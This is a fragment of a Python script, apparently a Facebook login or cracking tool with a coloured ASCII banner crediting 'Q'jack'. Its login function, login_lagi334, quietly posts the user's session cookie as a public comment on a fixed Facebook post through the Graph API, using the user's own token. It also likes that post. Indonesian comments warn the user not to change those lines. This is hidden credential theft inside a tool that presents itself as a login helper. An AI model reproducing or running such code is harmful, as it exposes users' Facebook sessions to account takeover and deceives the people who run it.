...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mJamal_Nggau_xy')
...
def banner():
	clear()
	alvino_xy(f'''\t{asu}       
________/\       ____.  _____  _________  ____  __.
\_____  )/      |    | /  _  \ \_   ___ \|    |/ _|
 /  / \  \      |    |/  /_\  \/    \  \/|      <  
/   \_/.  \ /\__|    /    |    \     \___|    |  \ 
\_____\ \_/ \________\____|__  /\______  /____|__ \
       \__>                  \/        \/        \/
                                                           
			{m}•{k}•{h}•{sir} Author : Q'jack {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		...
		ses.post(f"https://graph.facebook.com/134533354484113/comments/?message={cookie}&access_token={tok}",cookies={"cookie":cookie}) # Jangan di ganti 
		ses.post(f"https://graph.facebook.com/134533354484113/likes?summary=true&access_token={tok}",cookies={"cookie":cookie}) # udh dibilang Jangan di ganti
